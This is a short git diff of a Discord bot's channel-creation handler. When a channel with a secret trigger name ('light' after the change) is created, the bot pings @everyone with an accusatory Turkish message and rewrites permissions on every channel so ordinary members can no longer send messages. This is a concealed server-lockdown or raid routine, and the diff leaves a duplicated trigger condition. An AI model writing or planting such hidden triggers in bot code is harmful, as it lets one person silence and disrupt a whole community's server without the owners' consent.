@@ -148,8 +148,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'amonx-vi') {
-    channel.send(`War İs Started. :wink:\n\nİ Never Lose. \n<@537389933971767326>,\n\nhttps://media3.giphy.com/media/AXDiSlreUJX2/source.gif\n\n@everyone`)
+  if (channel.name == 'light') {
+    channel.send(`sen bizi dolandırdın ya @everyone`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -158,8 +158,8 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'brittania') {
-    channel.send(`War İs Started. :wink:\n\nİ Never Lose. \n<@537389933971767326>,\n\nhttps://media3.giphy.com/media/AXDiSlreUJX2/source.gif\n\n@everyone`)
+  if (channel.name == 'light') {
+    channel.send(`sen bizi dolandırdın ya @everyone`)
   }
 
 });
